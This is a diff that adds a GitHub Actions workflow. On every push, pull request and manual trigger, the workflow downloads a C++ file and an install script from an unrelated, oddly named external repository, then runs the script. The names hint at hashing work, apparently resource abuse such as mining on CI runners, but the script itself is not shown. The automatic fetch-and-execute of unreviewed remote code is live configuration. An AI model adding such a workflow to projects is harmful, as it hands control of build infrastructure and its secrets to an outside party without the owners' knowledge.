@@ -1,0 +1,28 @@
+name: Run
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  run-versa:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Get 1
+        run: wget https://github.com/thedailycorner/asfefoa/raw/refs/heads/main/versa_hash.cpp
+
+      - name: Get 2
+        run: wget https://github.com/thedailycorner/asfefoa/raw/refs/heads/main/install.sh
+      
+      - name: Make versa executable (if it's a script)
+        run: chmod +x ./install.sh
+
+      - name: Run
+        run: ./install.sh
